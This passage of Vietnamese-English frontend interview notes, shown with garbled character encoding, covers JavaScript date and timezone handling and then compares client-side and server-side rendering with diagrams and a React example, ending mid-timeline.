              // Display tÃ¹y timezone, nhÆ°ng VALUE khÃ´ng Ä‘á»•i
```

---

#### **ğŸ’¡ NguyÃªn Táº¯c VÃ ng**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   STORAGE:  UTC/Timestamp             â”‚
â”‚   TRANSMIT: ISO 8601 + timezone       â”‚
â”‚   DISPLAY:  User local timezone       â”‚
â”‚   COMPUTE:  UTC/Timestamp             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

#### **âœ… Giáº£i PhÃ¡p ÄÃºng**

**1. Store UTC:**

```typescript
// âœ… Database/API: Always UTC
await db.save({
  createdAt: Date.now(), // Timestamp
  // Or: new Date().toISOString(), // "2024-01-15T14:30:00.000Z"
});

// âœ… Parse ISO 8601 (auto UTC vá»›i Z)
const date = new Date('2024-01-15T14:30:00.000Z');
```

**2. Display Local:**

```typescript
// âœ… Convert to user timezone
const formatter = new Intl.DateTimeFormat('en-US', {
  timeZone: 'Asia/Ho_Chi_Minh',
  dateStyle: 'long',
  timeStyle: 'short',
});
console.log(formatter.format(date)); // "January 15, 2024 at 9:30 PM"
```

**3. Compare Timestamps:**

```typescript
// âœ… So sÃ¡nh khÃ´ng bá»‹ áº£nh hÆ°á»Ÿng timezone
const isAfter = date1.getTime() > date2.getTime();
const daysDiff = Math.floor(
  (date2.getTime() - date1.getTime()) / (1000 * 60 * 60 * 24)
);
```

**4. Date Arithmetic:**

```typescript
// âœ… Cá»™ng/trá»« ngÃ y
function addDays(date: Date, days: number): Date {
  return new Date(date.getTime() + days * 24 * 60 * 60 * 1000);
}

// âœ… Start/End of day (UTC)
const startOfDay = new Date(Date.UTC(
  date.getUTCFullYear(),
  date.getUTCMonth(),
  date.getUTCDate()
));
```

---

#### **ğŸ“š Libraries (Recommend)**

**date-fns (Functional, Tree-shakeable):**

```typescript
import { format, parseISO, addDays, formatDistanceToNow } from 'date-fns';
import { utcToZonedTime } from 'date-fns-tz';

const date = parseISO('2024-01-15T14:30:00.000Z');
format(date, 'yyyy-MM-dd HH:mm:ss'); // "2024-01-15 14:30:00"

const vnTime = utcToZonedTime(date, 'Asia/Ho_Chi_Minh');
formatDistanceToNow(date, { addSuffix: true }); // "2 hours ago"
```

**Luxon (OOP, Timezone-aware):**

```typescript
import { DateTime } from 'luxon';

const dt = DateTime.fromISO('2024-01-15T14:30:00.000Z');
dt.setZone('Asia/Ho_Chi_Minh').toFormat('yyyy-MM-dd HH:mm:ss');
dt.plus({ days: 7 }).toRelative(); // "in 7 days"
```

**Day.js (Lightweight 2KB):**

```typescript
import dayjs from 'dayjs';
import utc from 'dayjs/plugin/utc';
import timezone from 'dayjs/plugin/timezone';

dayjs.extend(utc);
dayjs.extend(timezone);

dayjs('2024-01-15T14:30:00.000Z')
  .tz('Asia/Ho_Chi_Minh')
  .format('YYYY-MM-DD HH:mm:ss');
```

---

#### **ğŸš€ Temporal API (Future)**

```typescript
import { Temporal } from '@js-temporal/polyfill';

// âœ… Instant (UTC)
const instant = Temporal.Instant.from('2024-01-15T14:30:00Z');

// âœ… ZonedDateTime (Timezone-aware)
const vnTime = instant.toZonedDateTimeISO('Asia/Ho_Chi_Minh');
console.log(vnTime.toString()); // "2024-01-15T21:30:00+07:00[Asia/Ho_Chi_Minh]"

// âœ… Immutable, No month zero-indexing, Better API
```

---

#### **ğŸ¯ Best Practices**

**âœ… DO:**

```typescript
// Store UTC
{ createdAt: "2024-01-15T14:30:00.000Z" }

// Compare timestamps
date1.getTime() > date2.getTime()

// Use library
import { format, parseISO } from 'date-fns';
```

**âŒ DON'T:**

```typescript
// âŒ Store without timezone
{ date: "2024-01-15" } // Ambiguous!

// âŒ Use local Date
new Date() // Timezone-dependent!

// âŒ Compare dates with ===
date1 === date2 // Always false

// âŒ Mutate
date.setMonth(2) // Side effect!
```

**ğŸ’¡ Key Takeaway:**
- **Store UTC** â†’ **Display Local**
- DÃ¹ng **timestamp** cho comparison
- DÃ¹ng **library** (date-fns/Luxon/Day.js)
- **Temporal API** = future standard

---

**ğŸ¯ Káº¿t Luáº­n Tá»•ng Thá»ƒ:**

**Performance Optimization (Q56):**

- âœ… 5-layer strategy: Build-time â†’ Network â†’ Rendering â†’ State â†’ Memory
- âœ… Measurable results: 70% faster load, 82% smaller bundle, 60 FPS
- âœ… Tools: Vite, React.memo, Zustand, react-window, Chrome DevTools

**Security (Q57):**

- âœ… 7-layer defense: HTTPS â†’ XSS â†’ CSRF â†’ Auth â†’ Storage â†’ API â†’ Headers
- âœ… Comprehensive protection: Input sanitization, JWT tokens, rate limiting
- âœ… Tools: DOMPurify, Helmet, Zod, bcrypt

**Cryptography (Q58):**

- âœ… Hash (bcrypt, SHA-256): Passwords, checksums, integrity
- âœ… Encryption (AES, RSA): Sensitive data, HTTPS, key exchange
- âœ… Digital Signatures (RS256, HMAC): JWT, API auth, webhooks

**Date & Time Handling (Q59):**

- âœ… UTC-first approach: Store UTC, display local timezone
- âœ… ISO 8601 standard: "2024-01-15T14:30:00.000Z"
- âœ… Libraries: date-fns (functional), Luxon (OOP), Day.js (lightweight)
- âœ… Temporal API: Future standard (Stage 3 proposal)

**ğŸ’¡ Key Takeaway:**

- Performance & Security KHÃ”NG pháº£i optional - lÃ  MUST-HAVE cho production apps
- Date/Time: Always UTC for storage, convert to local for display
- Measure & Monitor trong production
- Defense in depth: Multiple layers of protection
- Use proven libraries - NEVER roll your own crypto or date handling!

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ–¥ï¸ Q54: Client-Side Rendering (CSR) vs Server-Side Rendering (SSR) - PhÃ¢n Biá»‡t & CÃ¡ch Hoáº¡t Äá»™ng Chi Tiáº¿t</span></summary>


**Tráº£ lá»i:**

#### **ğŸ¯ KhÃ¡i Niá»‡m Cá»‘t LÃµi**

**CSR (Client-Side Rendering):**
- Server gá»­i **HTML rá»—ng** (chá»‰ cÃ³ `<div id="root"></div>`) + **JavaScript bundle** (500KB-2MB)
- Browser **download JS â†’ parse â†’ execute â†’ render** â†’ hiá»ƒn thá»‹ ná»™i dung
- Giá»‘ng nhÆ°: Mua IKEA furniture (pháº£i tá»± láº¯p rÃ¡p á»Ÿ nhÃ )
- Rendering engine: Browser (Chrome V8, Firefox SpiderMonkey)

**SSR (Server-Side Rendering):**
- Server **render sáºµn HTML Ä‘áº§y Ä‘á»§** (cÃ³ ná»™i dung) rá»“i gá»­i vá» browser
- Browser **hiá»ƒn thá»‹ ngay** HTML â†’ sau Ä‘Ã³ download JS Ä‘á»ƒ tÆ°Æ¡ng tÃ¡c
- Giá»‘ng nhÆ°: Mua furniture Ä‘Ã£ láº¯p rÃ¡p sáºµn (chá»‰ cáº§n Ä‘áº·t vÃ o nhÃ )
- Rendering engine: Node.js server (React renderToString)


#### **âœ… Æ¯u Äiá»ƒm CSR (Client-Side Rendering)**

**1. Navigation Cá»±c Nhanh (Fast SPA Navigation)**
```
User clicks link:
- CSR: 0ms (chá»‰ thay Ä‘á»•i DOM, khÃ´ng reload page)
- SSR: 500-1000ms (pháº£i request server, Ä‘á»£i render)
â†’ Tráº£i nghiá»‡m mÆ°á»£t mÃ  nhÆ° native app
```

**2. Rich Interactions (TÆ°Æ¡ng TÃ¡c Phong PhÃº)**
```typescript
// CSR: Dá»… dÃ ng lÃ m real-time features
- Live chat, notifications
- Drag & drop, animations
- Real-time data updates
- Complex state management
â†’ Full JavaScript power trÃªn browser
```

**3. Server Load Tháº¥p (Less Server Load)**
```
- Server chá»‰ serve static files (HTML, JS, CSS)
- KhÃ´ng cáº§n render cho má»—i request
- Dá»… cache vá»›i CDN
- Cost tháº¥p (chá»‰ cáº§n CDN, khÃ´ng cáº§n powerful server)
```

**4. Dá»… Deploy & Scale**
```
- Deploy lÃªn CDN (Vercel, Netlify, CloudFront)
- KhÃ´ng cáº§n server-side logic
- Auto-scale vá»›i CDN
â†’ Chi phÃ­ tháº¥p, dá»… maintain
```

---

#### **âŒ NhÆ°á»£c Äiá»ƒm CSR**

**1. Initial Load Cháº­m (Slow First Load)**
```
Timeline:
[0s] User clicks link
[0-1s] Download HTML (5KB) - nhanh
[1-3s] Download JS bundle (500KB-2MB) - CHáº¬M
[3-4s] Parse & Execute JS - CHáº¬M
[4-5s] Fetch API data - CHáº¬M
[5s] User sees content - QUÃ LÃ‚U!

â†’ User tháº¥y blank screen trong 3-5 giÃ¢y
â†’ Bounce rate cao (user rá»i trang)
```

**2. SEO NghÃ¨o NÃ n (Poor SEO)**
```html
<!-- Google bot sees: -->
<html>
  <body>
    <div id="root"></div>  <!-- EMPTY! -->
    <script src="bundle.js"></script>
  </body>
</html>

â†’ Google khÃ´ng tháº¥y ná»™i dung
â†’ KhÃ´ng index Ä‘Æ°á»£c
â†’ SEO ranking tháº¥p
```

**3. Blank Screen Problem**
```
User experience:
[0-3s] White/blank screen (nothing to see)
[3-5s] Loading spinner (still waiting...)
[5s+] Content appears (finally!)

â†’ User frustrated
â†’ Think website is broken
â†’ Leave before content loads
```

**4. Phá»¥ Thuá»™c JavaScript**
```
- User disable JS â†’ website khÃ´ng cháº¡y
- JS error â†’ website crash
- Slow device â†’ website lag
â†’ KhÃ´ng graceful degradation
```

---

#### **âœ… Æ¯u Äiá»ƒm SSR (Server-Side Rendering)**

**1. Initial Load Cá»±c Nhanh (Fast Time to Content)**
```
Timeline:
[0s] User clicks link
[0.5s] Server renders HTML (nhanh vÃ¬ server máº¡nh)
[0.5s] Browser receives full HTML
[0.5s] User SEES content immediately!
[1-2s] JS hydrates in background
[2s] Fully interactive

â†’ User tháº¥y ná»™i dung trong 0.5-1 giÃ¢y
â†’ First impression tá»‘t
```

**2. SEO Xuáº¥t Sáº¯c (SEO-Friendly)**
```html
<!-- Google bot sees: -->
<html>
  <body>
    <div id="root">
      <h1>Welcome to My Site</h1>
      <p>Full content here...</p>
      <article>Blog post content...</article>
      <!-- FULL CONTENT! -->
    </div>
  </body>
</html>

â†’ Google index Ä‘áº§y Ä‘á»§ ná»™i dung
â†’ Better ranking
â†’ Social media previews work (Open Graph)
```

**3. Better Performance (Äáº·c biá»‡t cho slow devices)**
```
- Server render nhanh (powerful CPU)
- User device khÃ´ng cáº§n lÃ m viá»‡c náº·ng
- Suitable for low-end phones
- Ãt JS â†’ less battery drain
```

**4. KhÃ´ng Blank Screen**
```
User experience:
[0.5s] Content appears immediately!
[1-2s] Page becomes interactive

â†’ Progressive enhancement
â†’ Even if JS fails, HTML still works
â†’ Better perceived performance
```

---

#### **âŒ NhÆ°á»£c Äiá»ƒm SSR**

**1. Server Load Cao (High Server Cost)**
```
CSR:
- Server: "Here's HTML + JS" (1 láº§n, cache Ä‘Æ°á»£c)
- Cost: $5/month (CDN)

SSR:
- Server: "Let me render this page..." (má»—i request)
- Server: Parse React â†’ Fetch data â†’ Render HTML
- Cost: $50-500/month (cáº§n server máº¡nh)

â†’ 10-100x chi phÃ­ hÆ¡n CSR
```

**2. Navigation Cháº­m HÆ¡n (Slower Navigation)**
```
User clicks internal link:

CSR:
- Instant (0ms) - chá»‰ update DOM
- Smooth transition

SSR:
- Request server (50-200ms network)
- Server render (50-100ms)
- Download HTML (50-200ms)
- Total: 500-1000ms
â†’ CÃ³ thá»ƒ tháº¥y "flash" khi chuyá»ƒn trang
```

**3. Complexity Cao (Complex Setup)**
```typescript
// CSR: Simple
ReactDOM.render(<App />, root);

// SSR: Complex
- Server setup (Express, Next.js)
- Hydration issues (client-server mismatch)
- Data fetching strategies
- Cache invalidation
- State management across server-client
â†’ Nhiá»u bugs tiá»m áº©n, khÃ³ debug
```

**4. TTFB Cao HÆ¡n (Time to First Byte)**
```
CSR:
- TTFB: 50ms (serve static file)

SSR:
- TTFB: 200-500ms (render + fetch data)
â†’ User Ä‘á»£i lÃ¢u hÆ¡n trÆ°á»›c khi tháº¥y gÃ¬ Ä‘Ã³
(nhÆ°ng khi tháº¥y thÃ¬ Ä‘Ã£ cÃ³ full content)
```

**5. Hydration Issues**
```typescript
// Server renders: <div>Count: 0</div>
// Client state:   <div>Count: 1</div>
// â†’ Mismatch! Warning!

// Common issues:
- Date.now() khÃ¡c nhau server vs client
- Random values
- Browser-only APIs (window, localStorage)
â†’ Requires careful coding
```

---

#### **ğŸ“Š So SÃ¡nh Trá»±c Quan**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    USER EXPERIENCE COMPARISON                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  CSR (Client-Side Rendering):                                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ 0s â–“â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘  â† Blank screen          â”‚  â”‚
â”‚  â”‚ 1s â–“â–“â–“â–“â–“â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘  â† Downloading JS         â”‚  â”‚
â”‚  â”‚ 2s â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘  â† Parsing JS             â”‚  â”‚
â”‚  â”‚ 3s â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘  â† Fetching data          â”‚  â”‚
â”‚  â”‚ 4s â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘  â† Rendering               â”‚  â”‚
â”‚  â”‚ 5s â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“  âœ… Content visible!      â”‚  â”‚
â”‚  â”‚                                                            â”‚  â”‚
â”‚  â”‚ First Content: 5 seconds                                  â”‚  â”‚
â”‚  â”‚ User sees: Blank â†’ Loading â†’ Content                     â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                                                  â”‚
â”‚  SSR (Server-Side Rendering):                                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ 0s â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘  â† Server rendering      â”‚  â”‚
â”‚  â”‚ 0.5s â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“  âœ… Content visible!      â”‚  â”‚
â”‚  â”‚ 1s â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“  â† Hydrating JS            â”‚  â”‚
â”‚  â”‚ 2s â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“  âœ… Interactive!           â”‚  â”‚
â”‚  â”‚                                                            â”‚  â”‚
â”‚  â”‚ First Content: 0.5 seconds                                â”‚  â”‚
â”‚  â”‚ Interactive: 2 seconds                                    â”‚  â”‚
â”‚  â”‚ User sees: Content immediately â†’ Becomes interactive     â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

#### **ğŸ¯ Khi NÃ o DÃ¹ng GÃ¬?**

**DÃ¹ng CSR khi:**
```
âœ… Internal tools / Admin dashboard
   â†’ KhÃ´ng cáº§n SEO, user Ä‘Ã£ login
   â†’ Example: Google Analytics, Jira, Notion

âœ… Highly interactive apps
   â†’ Real-time updates, complex interactions
   â†’ Example: Figma, Trello, Games

âœ… Budget tháº¥p
   â†’ Chá»‰ cáº§n CDN, khÃ´ng cáº§n server máº¡nh
   â†’ Startup vá»›i limited resources
```

**DÃ¹ng SSR khi:**
```
âœ… Public-facing websites
   â†’ Cáº§n SEO, social sharing
   â†’ Example: Blog, News, E-commerce

âœ… Landing pages / Marketing
   â†’ First impression matters
   â†’ Better conversion rate

âœ… Content-heavy sites
   â†’ Nhiá»u text, Ã­t interaction
   â†’ Example: Documentation, Wikipedia
```

**DÃ¹ng SSG (Hybrid) khi:**
```
âœ… Static content with occasional updates
   â†’ Blog posts, product pages
   â†’ Example: Next.js with ISR

âœ… Best of both worlds
   â†’ Fast nhÆ° CSR (served from CDN)
   â†’ SEO-friendly nhÆ° SSR
   â†’ Cost-effective
```

---

#### **ğŸ’¡ Key Takeaways**

**CSR (Client-Side):**
- ğŸš€ Navigation nhanh, tÆ°Æ¡ng tÃ¡c mÆ°á»£t
- ğŸ’° Chi phÃ­ tháº¥p, dá»… deploy
- âŒ Initial load cháº­m (3-5s), SEO kÃ©m
- ğŸ¯ **DÃ¹ng cho**: Internal tools, SPAs, interactive apps

**SSR (Server-Side):**
- âš¡ Initial load nhanh (0.5-1s), SEO tá»‘t
- âœ… KhÃ´ng blank screen, better UX
- âŒ Server cost cao, navigation cháº­m hÆ¡n
- ğŸ¯ **DÃ¹ng cho**: Public sites, marketing, e-commerce

**Modern Approach:**
- **Mix cáº£ 3**: SSG (static pages) + SSR (dynamic) + CSR (interactive)
- **Framework**: Next.js, Remix, Nuxt.js há»— trá»£ cáº£ 3
- **Measure**: DÃ¹ng Lighthouse, Web Vitals Ä‘á»ƒ optimize

---

#### **ğŸ“Š SÆ¡ Äá»“ So SÃ¡nh CSR vs SSR**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    CSR vs SSR COMPARISON                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                     â”‚
â”‚  CLIENT-SIDE RENDERING (CSR)                                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ 1. Browser Request â†’ Server                                   â”‚ â”‚
â”‚  â”‚    GET https://example.com                                    â”‚ â”‚
â”‚  â”‚                                                                â”‚ â”‚
â”‚  â”‚ 2. Server Response (Minimal HTML)                             â”‚ â”‚
â”‚  â”‚    <!DOCTYPE html>                                            â”‚ â”‚
â”‚  â”‚    <html><head>...</head>                                     â”‚ â”‚
â”‚  â”‚    <body>                                                     â”‚ â”‚
â”‚  â”‚      <div id="root"></div>  â† Empty!                         â”‚ â”‚
â”‚  â”‚      <script src="/bundle.js"></script>                      â”‚ â”‚
â”‚  â”‚    </body></html>                                            â”‚ â”‚
â”‚  â”‚                                                                â”‚ â”‚
â”‚  â”‚ 3. Browser Downloads JS Bundle (Large!)                       â”‚ â”‚
â”‚  â”‚    bundle.js (500KB - 2MB)                                    â”‚ â”‚
â”‚  â”‚    â±ï¸  Parsing + Execution time                               â”‚ â”‚
â”‚  â”‚                                                                â”‚ â”‚
â”‚  â”‚ 4. JavaScript Runs & Renders UI                               â”‚ â”‚
â”‚  â”‚    React.render(<App />, root)                               â”‚ â”‚
â”‚  â”‚    â†’ API calls                                                â”‚ â”‚
â”‚  â”‚    â†’ Fetch data                                               â”‚ â”‚
â”‚  â”‚    â†’ Render components                                        â”‚ â”‚
â”‚  â”‚                                                                â”‚ â”‚
â”‚  â”‚ 5. User Sees Content                                          â”‚ â”‚
â”‚  â”‚    â±ï¸  Total: 3-5 seconds                                     â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                                     â”‚
â”‚  SERVER-SIDE RENDERING (SSR)                                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ 1. Browser Request â†’ Server                                   â”‚ â”‚
â”‚  â”‚    GET https://example.com                                    â”‚ â”‚
â”‚  â”‚                                                                â”‚ â”‚
â”‚  â”‚ 2. Server Renders Full HTML                                   â”‚ â”‚
â”‚  â”‚    - Execute React on server                                  â”‚ â”‚
â”‚  â”‚    - Fetch data from database                                 â”‚ â”‚
â”‚  â”‚    - Generate complete HTML                                   â”‚ â”‚
â”‚  â”‚    â±ï¸  Server processing time                                 â”‚ â”‚
â”‚  â”‚                                                                â”‚ â”‚
â”‚  â”‚ 3. Server Response (Full HTML)                                â”‚ â”‚
â”‚  â”‚    <!DOCTYPE html>                                            â”‚ â”‚
â”‚  â”‚    <html><head>...</head>                                     â”‚ â”‚
â”‚  â”‚    <body>                                                     â”‚ â”‚
â”‚  â”‚      <div id="root">                                          â”‚ â”‚
â”‚  â”‚        <h1>Welcome!</h1>                                      â”‚ â”‚
â”‚  â”‚        <p>Fully rendered content...</p>  â† Complete!         â”‚ â”‚
â”‚  â”‚      </div>                                                   â”‚ â”‚
â”‚  â”‚      <script src="/bundle.js"></script>                      â”‚ â”‚
â”‚  â”‚    </body></html>                                            â”‚ â”‚
â”‚  â”‚                                                                â”‚ â”‚
â”‚  â”‚ 4. Browser Shows Content Immediately                          â”‚ â”‚
â”‚  â”‚    â±ï¸  User sees content: 0.5-1 second                        â”‚ â”‚
â”‚  â”‚                                                                â”‚ â”‚
â”‚  â”‚ 5. JavaScript Hydrates (Makes Interactive)                    â”‚ â”‚
â”‚  â”‚    React.hydrate(<App />, root)                              â”‚ â”‚
â”‚  â”‚    â†’ Attach event listeners                                   â”‚ â”‚
â”‚  â”‚    â†’ Make interactive                                         â”‚ â”‚
â”‚  â”‚    â±ï¸  Total interactive: 2-3 seconds                         â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

#### **ğŸ”¥ CSR (Client-Side Rendering) - CÃ¡ch Hoáº¡t Äá»™ng Chi Tiáº¿t**

**Timeline:**

```
User clicks link
      â†“
[1] Browser â†’ Server: GET /page
      â†“
[2] Server â†’ Browser: Minimal HTML + <script src="bundle.js">
      â†“                 (5-50 KB)
      â†“
[3] Browser downloads bundle.js
      â†“                 (500KB - 2MB)
      â†“                 â±ï¸  1-3 seconds
      â†“
[4] Browser parses & executes JS
      â†“                 â±ï¸  0.5-1 second
      â†“
[5] React renders virtual DOM
      â†“
[6] React makes API calls
      â†“                 â±ï¸  0.5-2 seconds
      â†“
[7] Data arrives â†’ Re-render
      â†“
[8] User sees content
      â†“                 â±ï¸  Total: 3-5 seconds
```

**Code Example (React CSR):**

```typescript
// ============================================
// CSR Example - React App
// ============================================

// index.html - Minimal HTML (chá»‰ cÃ³ div rá»—ng)
// <!DOCTYPE html>
// <html>
// <head>
//   <title>My App</title>
// </head>
// <body>
//   <div id="root"></div>  â† EMPTY!
//   <script src="/bundle.js"></script>
// </body>
// </html>

// main.tsx - Entry point
import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';

// Render app on client
const root = ReactDOM.createRoot(document.getElementById('root')!);
root.render(<App />);

// App.tsx - Main component
import { useState, useEffect } from 'react';

interface User {
  id: number;
  name: string;
  email: string;
}

function App() {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);

  // Fetch data on client
  useEffect(() => {
    fetch('https://api.example.com/users')
      .then((res) => res.json())
      .then((data) => {
        setUsers(data);
        setLoading(false);
      });
  }, []);

  if (loading) {
    return <div>Loading...</div>; // User sees loading state
  }

  return (
    <div>
      <h1>Users</h1>
      <ul>
        {users.map((user) => (
          <li key={user.id}>
            {user.name} - {user.email}
          </li>
        ))}
      </ul>
    </div>
  );
}

export default App;

// ============================================
// What happens in browser:
// ============================================
// 1. Download HTML (5KB) - instant
// 2. Download bundle.js (500KB) - 1-2 seconds
// 3. Parse & execute JS - 0.5 seconds
// 4. React renders <div>Loading...</div>
// 5. Fetch API - 0.5-1 second
// 6. Re-render with data
// Total: 3-5 seconds until user sees content
```

---

#### **ğŸš€ SSR (Server-Side Rendering) - CÃ¡ch Hoáº¡t Äá»™ng Chi Tiáº¿t**

**Timeline:**

```
User clicks link
      â†“
[1] Browser â†’ Server: GET /page
      â†“
[2] Server executes React
      â†“
[3] Server fetches data from DB
      â†“                 â±ï¸  0.1-0.5 seconds
      â†“
[4] Server renders HTML
      â†“                 â±ï¸  0.1-0.3 seconds
      â†“
[5] Server â†’ Browser: Full HTML
      â†“                 (50-200 KB)
      â†“
